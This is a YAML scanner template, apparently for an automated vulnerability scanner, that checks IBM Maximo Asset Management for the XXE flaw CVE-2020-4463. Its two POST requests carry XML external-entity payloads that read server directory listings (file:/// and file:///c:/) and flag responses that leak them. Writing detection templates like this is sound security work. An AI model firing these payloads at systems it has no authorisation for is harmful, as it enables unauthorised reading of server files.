id: cve-2020-4463
info:
  name: IBM Maximo Asset Management XXE (CVE-2020-4463)
  risk: High
params:
- root: '{{.BaseURL}}'
references:
- reference: https://github.com/Ibonok/CVE-2020-4463
replicate:
  prefixes: maximo
requests:
- body: "<?xml version='1.0' encoding='UTF-8'?>\n<!DOCTYPE foo [\n    <!ELEMENT foo\
    \ ANY>\n    <!ENTITY xxe SYSTEM \"file:///\">\n]>\n<max:QueryMXPERSON xmlns:max='http://www.ibm.com/maximo'>\n\
    \    <max:MXPERSONQuery>\n        <max:PERSON>\n            <max:PERSONUID>&xxe;</max:PERSONUID>\n\
    \        </max:PERSON>\n    </max:MXPERSONQuery>\n</max:QueryMXPERSON>\n"
  detections:
  - 'StatusCode() == 500 && StringSearch(''response'', ''Error 500: For input string'')
    && StringSearch(''response'', ''bin'')'
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  - Content-Type: application/xml
  method: POST
  redirect: false
  url: '{{.root}}/meaweb/os/mxperson'
- body: "<?xml version='1.0' encoding='UTF-8'?>\n<!DOCTYPE foo [\n    <!ELEMENT foo\
    \ ANY>\n    <!ENTITY xxe SYSTEM \"file:///c:/\">\n]>\n<max:QueryMXPERSON xmlns:max='http://www.ibm.com/maximo'>\n\
    \    <max:MXPERSONQuery>\n        <max:PERSON>\n            <max:PERSONUID>&xxe;</max:PERSONUID>\n\
    \        </max:PERSON>\n    </max:MXPERSONQuery>\n</max:QueryMXPERSON>\n"
  detections:
  - 'StatusCode() == 500 && StringSearch(''response'', ''Error 500: For input string'')
    && StringSearch(''response'', ''Windows'')'
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  - Content-Type: application/xml
  method: POST
  redirect: false
  url: '{{.root}}/meaweb/os/mxperson'
